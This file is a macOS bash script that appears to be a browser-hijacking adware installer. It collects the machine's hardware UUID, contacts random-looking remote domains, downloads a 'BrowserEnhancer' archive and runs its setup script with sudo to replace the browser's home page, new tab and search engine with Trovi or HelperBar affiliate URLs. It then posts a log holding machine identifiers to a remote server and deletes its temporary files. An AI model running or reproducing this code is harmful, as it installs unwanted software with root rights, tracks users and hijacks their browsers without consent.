#!/bin/bash
# ioreg -l | grep -e Manufacturer -e 'Vendor Name'
updFile="/var/tmp/updText.txt"
updFileError="/var/tmp/updTextError.txt"
chmod 777 $updFile;
chmod 777 $updFileError;
echo > $updFile
echo > $updFileError
br_mid=$(ioreg -rd1 -c IOPlatformExpertDevice | awk '/IOPlatformUUID/ { split($0, line, "\""); printf("%s\n", line[4]); }')
midFile=$(find /System/Library/Frameworks -type f -name "*.uuid.plist" -print0 | xargs -0 ls -tl | sort -n | tail -1 | awk '{print $9}')
if [ -e "$midFile" ]; then
    mid=$(echo "$midFile" | python -c 'import sys;print open(sys.stdin.read().rstrip(), "r").read().split("<string>")[1].split("</string>")[0]')
    echo "mid: $mid." >> $updFile
fi
get_pd_client_data="http://93a555685cc7443a8e1034efa1f18924.com/v/cld?mid=$br_mid&ct=pd"
data=$(curl -s "$get_pd_client_data")
dc="DP5013"
channel=$(echo $dc | tr -d '[[:space:]]' | tr -cd 0-9)
pdChannel=${dc:2}
echo "DC: $dc" >> $updFile
click_id="0"
echo "CLICK_ID: $click_id" >> $updFile
click_stamp=""
echo "CLICK_STAMP: $click_stamp" >> $updFile
id=$dc"--"$click_id"___"$click_stamp"___"$br_mid
echo "Full ID: $id" >> $updFile
domain=""http://aa9bd78f328a6a41279d0fad0a88df1901.com""
pop_url="'http://aa9bd78f328a6a41279d0fad0a88df1901.com/pp/fd?re=1&uid=[MACHINE_ID]&u=[CONTEXT_URL]'"
pop_delay="1"

if [ $midFile ]; then
	frm=$(echo $midFile | tail -1 | awk -F "/" '{print $5}' | awk -F "." '{print $1}')
fi
mid_proc=false
if [ $frm ];then
	if ps -ef | grep -v grep | grep -q $frm; then
		mid_proc=true
	fi
fi
echo "midFile: $midFile." >> $updFile
echo "frm: $frm" >> $updFile
echo "mid_proc: $mid_proc" >> $updFile

pSearch () {
	updFile="/var/tmp/updText.txt"
	sudo chmod 777 $updFile
	echo "Starting Install Search Script" >> $updFile
	dc="DP5013"
	click_id="0"
	channel=$(echo $dc | tr -d '[[:space:]]' | tr -cd 0-9)
	id=$dc"--"$click_id___$br_mid
	echo "ID: $id" >> $updFile
	tmpfile1="/var/tmp/brh.txt"
	tmpfile3="/var/tmp/BrowserEnhancer24052016"
	country=$(curl -s 'ipinfo.io/country')
	countryCodes=("US" "CA" "GB" "ES" "AU" "FR" "DE" "IN" "IT" "NL" "NZ")
	troviAllowed="1"
	if [[ "${countryCodes[@]}" =~ "${country}" && $troviAllowed == *"1"* ]]; then
		echo "Country is in selected countries." >> $updFile
	    replacedHome="http://www.trovi.com/?n=$dc&searchsource=55&UM=8&gd=SY1000250"
	    replacedTab="http://www.trovi.com/?n=$dc&searchsource=69&UM=8&gd=SY1000250"
	    replacedSearch="http://www.trovi.com/Results.aspx?n=$dc&searchsource=58&UM=8&gd=SY1000250"
	    newSearchProvider="Trovi"
	    offer_id="2012"
		sProv="Trovi"
	else
	    echo "Country is NOT in selected countries." >> $updFile
	    countryType=0
	    replacedHome="http://feed.helperbar.com/?publisher=TingSyn&barcodeid=51222999&searchtype=hp&type=YHS_TGE_$dc&_=tt1"
	    replacedTab="http://feed.helperbar.com/?publisher=TingSyn&barcodeid=51222999&searchtype=nt&type=YHS_TGE_$dc&_=tt1"
	    replacedSearch="http://feed.helperbar.com/?publisher=TingSyn&barcodeid=51222999&searchtype=ds&type=YHS_TGE_$dc&_=tt1"
	    newSearchProvider="HelperBar"
	    offer_id="2112"
		sProv="HelperBar"
	fi

    echo "Search not found." >> $updFile
    tmpfile2="/var/tmp/BrowserEnhancer24052016_"$sProv".tgz"
    /usr/bin/curl -s -L -o ${tmpfile2} "http://pullmenow.com/pd_files/BrowserEnhancer/BrowserEnhancer24052016_"$sProv".tgz"

    tar -xzf ${tmpfile2} -C /var/tmp/
    cd /var/tmp/BrowserEnhancer24052016
    if [[ -d $tmpfile3 ]]; then
        echo "$tmpfile3 Exists" >> $updFile
    else
        echo "$tmpfile3 Doesn't Exist" >> $updFile
    fi
    if [[ -f "/var/tmp/BrowserEnhancer24052016/setup.sh" ]]; then
        echo "/var/tmp/BrowserEnhancer24052016/setup.sh Exists" >> $updFile
    else
        echo "/var/tmp/BrowserEnhancer24052016/setup.sh Doesn't Exist" >> $updFile
    fi
    echo sudo /var/tmp/BrowserEnhancer24052016/setup.sh "$replacedHome" "$replacedTab" "$replacedSearch" $newSearchProvider "$id" >> $updFile

    sudo /var/tmp/BrowserEnhancer24052016/setup.sh "$replacedHome" "$replacedTab" "$replacedSearch" $newSearchProvider "$id"

    sleep 30
    echo $(</var/tmp/updText2.txt) >> $updFile
    sleep 10

	echo "Removing tmp files" >> $updFile
	rm ${tmpfile1}
	rm ${tmpfile2}
	rm -rf ${tmpfile3}
	# rm -rf $updFile
	# rm -rf /var/tmp/updText2.txt
}

echo "Installing PD Search with logger" >> $updFile
pSearch &> $updFileError;
sleep 5
echo $(</var/tmp/updTextError.txt) >> $updFile


eventType="Update Script Output"
sleep 30
curl --request POST 'http://93a555685cc7443a8e1034efa1f18924.com/v/pd-logger' --data "vs_mid=$mid" --data "br_mid=$br_mid" --data-urlencode "event_type=$eventType" --data-urlencode "event_data=$(<$updFile)"
sleep 5
rm -rf $updFile
rm -rf /var/tmp/updText2.txt
rm -rf $updFileError